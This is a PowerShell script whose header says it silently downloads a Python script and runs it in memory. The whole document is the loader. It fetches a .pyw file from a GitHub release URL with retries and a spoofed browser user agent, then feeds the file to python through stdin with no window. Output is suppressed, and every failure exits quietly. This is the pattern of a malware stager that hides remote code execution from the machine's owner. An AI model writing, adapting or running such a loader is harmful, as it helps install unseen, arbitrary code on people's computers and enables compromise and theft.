# Silently download and run a Python script in memory with retries and error handling

# Configuration
$pythonScriptUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
$maxRetries = 5
$retryDelaySeconds = 5
$timeoutSeconds = 30

# Check if Python is installed
try {
    $null = python --version 2>&1
    if ($LASTEXITCODE -ne 0) { exit 1 }
} catch { exit 1 }

# Function to download the Python script with retries
function Get-PythonScriptContent {
    param ($Url)
    $attempt = 0
    $success = $false
    $scriptContent = $null

    while (-not $success -and $attempt -lt $maxRetries) {
        $attempt++
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.0")
            $scriptContent = $webClient.DownloadString($Url)
            $success = $true
        } catch {
            if ($attempt -lt $maxRetries) { Start-Sleep -Seconds $retryDelaySeconds }
            else { exit 1 }
        } finally {
            if ($webClient) { $webClient.Dispose() }
        }
    }
    return $scriptContent
}

# Download the Python script content
$pythonScriptContent = Get-PythonScriptContent -Url $pythonScriptUrl
if (-not $pythonScriptContent) { exit 1 }

# Execute the Python script in memory
try {
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = "python"
    $processInfo.Arguments = "-"
    $processInfo.RedirectStandardInput = $true
    $processInfo.UseShellExecute = $false
    $processInfo.CreateNoWindow = $true
    $processInfo.RedirectStandardOutput = $true
    $processInfo.RedirectStandardError = $true

    $process = [System.Diagnostics.Process]::Start($processInfo)
    $process.StandardInput.Write($pythonScriptContent)
    $process.StandardInput.Close()
    $process.WaitForExit($timeoutSeconds * 1000)

    if ($process.ExitCode -ne 0) { exit 1 }
} catch { exit 1 } finally {
    if ($process) { $process.Dispose() }
}
